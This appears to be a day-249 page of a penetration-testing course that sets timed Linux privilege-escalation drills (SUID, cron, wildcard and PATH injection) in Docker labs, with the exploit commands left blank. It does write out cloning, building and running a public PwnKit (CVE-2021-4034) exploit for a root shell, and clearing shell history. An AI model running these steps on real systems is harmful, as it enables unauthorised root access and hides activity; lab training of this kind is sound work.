---
title: "Infrastructure Practice Day 5 — Linux PrivEsc Drills: SUID, Cron, Kernel"
tags: [practice, linux, privilege-escalation, SUID, cron, kernel, speed-drill,
       muscle-memory, GTFOBins, T1548, T1053, T1068, ATT&CK]
module: 04-BroadSurface-04
day: 249
related_topics:
  - Linux PrivEsc Lab 1 — SUID and Sudo (Day 235)
  - Linux PrivEsc Lab 2 — Cron and Writable Files (Day 236)
  - Kernel Exploits (Day 237)
  - Milestone 250 (Day 250)
---

# Day 249 — Infrastructure Practice Day 5: Linux PrivEsc Drills

> "Speed drills exist for muscle memory. The difference between a 20-minute
> escalation and a 5-minute escalation is not intelligence — it is repetition.
> You have done each path once. Today you do each path three times, from scratch,
> timed. That is how the gaps close."
>
> — Ghost

---

## Goals

By the end of today's session you will have:

1. Executed 3 SUID exploitation paths from scratch without notes.
2. Executed 3 cron exploitation paths from scratch without notes.
3. Verified polkit (PwnKit) detection on the lab host.
4. Built a personal one-page PrivEsc reference from memory.

**Time budget:** 5–6 hours.

---

## Drill Structure

Each drill follows the same format:
1. Reset the lab environment to a clean state.
2. Clear your command history: `history -c`.
3. Start a timer.
4. Execute the path from scratch — no notes, no history, no GTFOBins.
5. Stop the timer when root is obtained.
6. Record the time and any command you had to think about.

---

## SUID Drills

### Drill S1 — Python3 with cap_setuid (Target: < 3 min)

```bash
# Lab setup (resets between drills):
docker compose -f privesc-drills.yml up -d suid-drill-1
docker exec -it suid-drill-1 su - labuser

# The lab has: /usr/bin/python3 with cap_setuid+ep
# Find it, exploit it, reach root shell.
history -c
# START TIMER
```

Record: time ___ min | hesitated on: ___

### Drill S2 — vim with SUID (Target: < 3 min)

```bash
docker compose -f privesc-drills.yml up -d suid-drill-2
docker exec -it suid-drill-2 su - labuser
# The lab has: /usr/bin/vim with SUID set
history -c
# START TIMER — exploit vim to get root
```

Record: time ___ min | hesitated on: ___

### Drill S3 — find with SUID (Target: < 2 min)

```bash
# The lab has: /usr/bin/find with SUID set
# Exploit it without looking up GTFOBins
history -c
# START TIMER
```

Record: time ___ min | hesitated on: ___

---

## Cron Drills

### Drill C1 — Writable Script (Target: < 5 min)

```bash
docker compose -f privesc-drills.yml up -d cron-drill-1
docker exec -it cron-drill-1 su - labuser
# Root cron runs /opt/scripts/backup.sh every minute
# backup.sh is writable by labuser
history -c
# START TIMER — get root via cron shell injection
```

Record: time ___ min

### Drill C2 — PATH Injection (Target: < 8 min)

```bash
docker compose -f privesc-drills.yml up -d cron-drill-2
# Cron PATH includes /home/labuser; script runs without full path
history -c
# START TIMER — create malicious binary, wait for cron
```

Record: time ___ min

### Drill C3 — Wildcard Injection (Target: < 10 min)

```bash
docker compose -f privesc-drills.yml up -d cron-drill-3
# Root cron runs: tar -czf /backups/data.tar.gz /var/data/*
# /var/data/ is writable by labuser
history -c
# START TIMER — exploit tar wildcard
```

Record: time ___ min

---

## PwnKit Verification

```bash
# Check if the lab host is vulnerable
pkexec --version
# If < 0.121: attempt CVE-2021-4034

git clone https://github.com/berdav/CVE-2021-4034.git /tmp/pwnkit
cd /tmp/pwnkit && make
./cve-2021-4034
# Expected: root shell
```

```
[ ] Polkit version checked: ___
[ ] Vulnerable: Y / N
[ ] If vulnerable: exploit executed, root obtained
```

---

## Personal PrivEsc Reference Card

Write the following from memory — no notes:

```
SUID exploitation commands:
  python3 (cap_setuid): ___
  vim (SUID): ___
  find (SUID): ___
  awk (SUID): ___

Cron exploitation commands:
  Writable script: ___
  PATH injection: ___
  Wildcard injection (tar): ___

Enumeration priority order (top 5):
  1. ___
  2. ___
  3. ___
  4. ___
  5. ___
```

Score yourself: how many did you write correctly without looking?
___ / 10

---

## Speed Improvement Grid

| Drill | Target | Run 1 | Run 2 (if time permits) |
|---|---|---|---|
| S1 — cap_setuid | < 3 min | ___ | ___ |
| S2 — vim SUID | < 3 min | ___ | ___ |
| S3 — find SUID | < 2 min | ___ | ___ |
| C1 — writable script | < 5 min | ___ | ___ |
| C2 — PATH injection | < 8 min | ___ | ___ |
| C3 — wildcard | < 10 min | ___ | ___ |

---

## Questions

> Add your questions here. Each question gets a Global ID (Q249.1, Q249.2 …).

---

## Navigation

← Previous: [Day 248 — Infrastructure Practice Day 4](DAY-0248-Infrastructure-Practice-Day-4.md)
→ Next: [Day 250 — Milestone 250 Days](DAY-0250-Milestone-250-Days.md)
